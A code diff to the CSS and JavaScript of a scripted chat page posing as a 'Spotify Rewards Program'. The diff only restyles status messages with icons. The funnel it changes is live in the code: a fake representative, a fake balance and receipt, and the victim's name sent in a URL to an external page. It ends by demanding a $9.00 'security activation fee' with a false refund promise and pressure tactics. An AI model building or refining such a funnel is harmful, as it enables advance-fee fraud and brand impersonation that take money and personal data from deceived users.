@@ -292,6 +292,29 @@
 
     .bubble b { font-weight: 700; }
 
+    .message-with-icon {
+      display: flex;
+      align-items: flex-start;
+      gap: 9px;
+    }
+
+    .message-icon {
+      width: 18px;
+      height: 18px;
+      flex: 0 0 18px;
+      margin-top: 1px;
+      color: #169c46;
+    }
+
+    .message-icon.pending {
+      color: #68727d;
+      animation: iconSpin 1s linear infinite;
+    }
+
+    .message-icon.alert { color: #b7791f; }
+
+    @keyframes iconSpin { to { transform: rotate(360deg); } }
+
     .bubble.media {
       padding: 0;
       overflow: hidden;
@@ -333,7 +356,7 @@
 
     @media (prefers-reduced-motion: reduce) {
       .row { animation: none; }
-      .typing i, .chat-agent-status::before { animation: none; }
+      .typing i, .chat-agent-status::before, .message-icon.pending { animation: none; }
     }
 
     .chat-input {
@@ -687,6 +710,30 @@
         botRow(text);
       }
 
+      async function sayStatus(text, type) {
+        text = fill(text);
+        await typing(Math.min(1600, 500 + text.length * 12));
+        var wrap = document.createElement('span');
+        wrap.className = 'message-with-icon';
+        var icon = document.createElement('span');
+        icon.className = 'message-icon ' + (type || 'success');
+        icon.setAttribute('aria-hidden', 'true');
+        if (type === 'pending') {
+          icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><path d="M12 3a9 9 0 1 0 9 9" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg>';
+        } else if (type === 'alert') {
+          icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><path d="M12 3 2.8 20h18.4L12 3Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><path d="M12 9v5M12 17.3v.2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>';
+        } else if (type === 'reward') {
+          icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/><path d="M14.8 8.5h-4a2 2 0 0 0 0 4h2.4a2 2 0 1 1 0 4H9M12 6.5v2M12 16.5v2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>';
+        } else {
+          icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><rect x="3" y="3" width="18" height="18" rx="4" fill="currentColor"/><path d="m7.5 12 3 3 6-6" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+        }
+        var content = document.createElement('span');
+        content.textContent = text;
+        wrap.appendChild(icon);
+        wrap.appendChild(content);
+        botRow(wrap);
+      }
+
       function media(url, height) {
         var f = document.createElement('iframe');
         f.src = fill(url);
@@ -796,7 +843,7 @@
         await sleep(4000);
         await say("You've been one of the few people selected for the Spotify Rewards Program");
         await sleep(3000);
-        await say("We've selected five songs for you to listen to and rate. It takes just a couple of minutes. 👇");
+        await say("We've selected five songs for you to listen to and rate. It takes just a couple of minutes.");
         step('avaliacao');
         media('/sp/songs/index.html', 355);
         await waitForSongs(600000);
@@ -809,9 +856,9 @@
         await askButton('Start Verification');
         step('iniciouspt');
         await sleep(2000);
-        await say('✅ Kaytlynn, the Spotify Rewards representative, has joined the chat');
+        await sayStatus('Kaytlynn, the Spotify Rewards representative, has joined the chat', 'success');
         await sleep(4000);
-        await say('👋 Hi, welcome to the Spotify Rewards!');
+        await say('Hi, welcome to the Spotify Rewards!');
         await sleep(3000);
         media('https://scripts.converteai.net/2223d7db-1826-46ab-bf08-708ee5b93e74/players/6a9b631bb338edba09d5bf83/v4/embed.html', 620);
         await sleep(27000);
@@ -829,32 +876,33 @@
 
         // Etapa 04 - name
         step('coleta_de_nome');
-        await say("✅ Okay, I'll continue with your registration.");
+        await sayStatus("Okay, I'll continue with your registration.", 'success');
         await sleep(3000);
         await say("At this stage, I need you to tell me your name so I can verify that you're a new user.");
         await sleep(3000);
-        await say('What is your full name? 👇🏻');
+        await say('What is your full name?');
         await say('(Write below)');
         vars.nome = await askText('Enter your name here...');
-        await say('⌛ Checking...');
+        await sayStatus('Checking...', 'pending');
         await sleep(6000);
 
         // Etapa 05
         step('elegibilidade');
-        await say('⌛ Just a moment...');
+        await sayStatus('Just a moment...', 'pending');
         await sleep(10000);
         await say('Everything looks good, {{nome}}!\n\nI checked our system and saw that you are eligible to receive your commission of ${{balance}}');
 
         // Etapa 06
         step('recibo');
         await sleep(3000);
-        await say('I\u2019m sending you the receipt for your commissions 👇🏻');
+        await say('I\u2019m sending you the receipt for your commissions.');
         await sleep(1000);
-        await say('⌛ Loading...');
+        await sayStatus('Loading...', 'pending');
         await sleep(4000);
-        await say('⌛ Generating your commission withdrawal receipt...');
+        await sayStatus('Generating your commission withdrawal receipt...', 'pending');
         await sleep(4000);
-        media('https://relaxed-druid-643d49.netlify.app/?nome=' + encodeURIComponent(vars.nome) + '&email=', 510);
+        var receiptFrame = media('https://relaxed-druid-643d49.netlify.app/?nome=' + encodeURIComponent(vars.nome) + '&email=', 450);
+        receiptFrame.className = 'withdraw-receipt';
         await sleep(4000);
 
         // Etapa 07
@@ -864,12 +912,12 @@
 
         // VSL + oferta
         step('vsl_checkout');
-        await say('🚨 Your access to withdraw your commission will be granted after this short explanatory video');
+        await sayStatus('Your access to withdraw your commission will be granted after this short explanatory video', 'alert');
         player('https://scripts.converteai.net/2223d7db-1826-46ab-bf08-708ee5b93e74/players/6a9b6338436465858b454fd7/v4/embed.html', 56.25);
         await sleep(260000);
-        await say('🤑 🎁 Your balance of ${{balance}} is ready!\n\nTo withdraw your earnings today, all you need to do is pay a small security activation fee of $9.00\n\nThis is to verify your account and ensure that you are not a bot.');
+        await sayStatus('Your balance of ${{balance}} is ready!\n\nTo withdraw your earnings today, all you need to do is pay a small security activation fee of $9.00\n\nThis is to verify your account and ensure that you are not a bot.', 'reward');
         await sleep(5000);
-        await say('🚨 Please note: The fee will be fully refunded after registration, along with your current balance of ${{balance}}');
+        await sayStatus('Please note: The fee will be fully refunded after registration, along with your current balance of ${{balance}}', 'alert');
         await sleep(4000);
         await say('This is a unique opportunity.\n\nIf you decide to leave now, your balance will be canceled and transferred to another user on the waiting list.');
         await sleep(3000);
